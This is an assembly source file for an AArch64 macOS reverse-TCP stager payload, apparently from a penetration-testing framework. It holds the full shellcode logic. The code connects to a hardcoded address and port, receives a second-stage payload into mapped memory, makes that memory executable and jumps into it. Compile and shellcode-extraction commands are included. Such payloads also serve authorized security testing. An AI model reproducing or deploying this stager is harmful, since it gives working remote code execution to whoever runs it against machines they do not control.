// Compile: clang stager_sock_reverse.s
// Shellcode: objdump -d a.out | cut -d ' ' -f 2- | ruby tools/payloads/format_aarch64.rb
.equ SYS_RECVFROM, 0x200001d
.equ SYS_MPROTECT, 0x200004a
.equ SYS_CONNECT, 0x2000062
.equ SYS_SELECT, 0x200005d
.equ SYS_SOCKET, 0x2000061
.equ SYS_MMAP, 0x20000c5
.equ SYS_EXIT, 0x2000001

.equ AF_INET, 0x2
.equ SOCK_STREAM, 0x1

.equ STDIN, 0x0
.equ STDOUT, 0x1
.equ STDERR, 0x2

.equ IP, 0x0100007f
.equ PORT, 0x5C11

.global _main
_main:
  /* mmap(addr=0, length=328, prot=0x2 (PROT_WRITE), flags=0x1002 (MAP_PRIVATE | MAP_ANON), fd=-1, offset=0) */
  mov x0, xzr
  mov x1, #328
  mov x2, #2
  mov x3, #0x1002
  mvn x4, xzr
  mov x5, xzr
  ldr x16, =SYS_MMAP
  svc 0
  cmn x0, #0x1
  beq failed

  /* save retry_count */
  mov x12, x0
  mov x10, 0
  adr x11, retry_count
  ldr x11, [x11]

  /* socket(AF_INET, SOCK_STREAM, IPPROTO_IP) */
socket:
  mov x0, AF_INET
  mov x1, SOCK_STREAM
  mov x2, 0
  ldr x16, =SYS_SOCKET
  svc 0
  //cbz w0, retry

  mov x13, x0

  /* connect(sockfd, socket={AF_INET,4444,127.0.0.1}, socklen_t=16) */
  adr x1, caddr
  ldr x1, [x1]
  str x1, [sp, #-8]!
  mov x1, sp
  mov x2, 16
  ldr x16, =SYS_CONNECT
  svc 0
  //cbnz w0, retry

  /* recvfrom(sockfd='x13', address='x12', length=328, flags=0x40 (MSG_WAITALL), from=0, fromlenaddr=0) */
  mov x0, x13
  mov x1, x12
  mov x2, #328
  mov x3, #0x40
  mov x4, xzr
  mov x5, xzr 
  ldr x16, =SYS_RECVFROM
  svc 0
  //cbnz w0, retry

  /* mprotect(addr, length=328, prot=0x5 (PROT_READ | PROT_EXEC)) */
  mov x0, x12
  mov x1, #328
  mov x2, #5
  ldr x16, =SYS_MPROTECT
  svc 0

  br x12

retry:
  sub x11, x11, #1
  cmp x11, 0
  beq failed

  /* select(0, 0, 0, 0, &{sleep_nanoseconds, sleep_seconds}) */
  mov x0, 0
  mov x1, 0
  adr x2, sleep_nanoseconds
  ldr x2, [x2]
  adr x3, sleep_seconds
  ldr x3, [x3]
  stp x3, x2, [sp, #-16]!
  mov x4, sp
  mov x2, 0
  mov x3, 0
  ldr x16, =SYS_SELECT
  svc 0
  bal socket

failed:
  mov x0, 0x1
  ldr x16, =SYS_EXIT
  svc 0

.balign 16
caddr:
  .short AF_INET
  .short PORT
  .word IP
retry_count:
  .word 0x4242
  .word 0x4242
sleep_nanoseconds:
  .word 0x4343
  .word 0x4343
sleep_seconds:
  .word 0x4444
  .word 0x4444
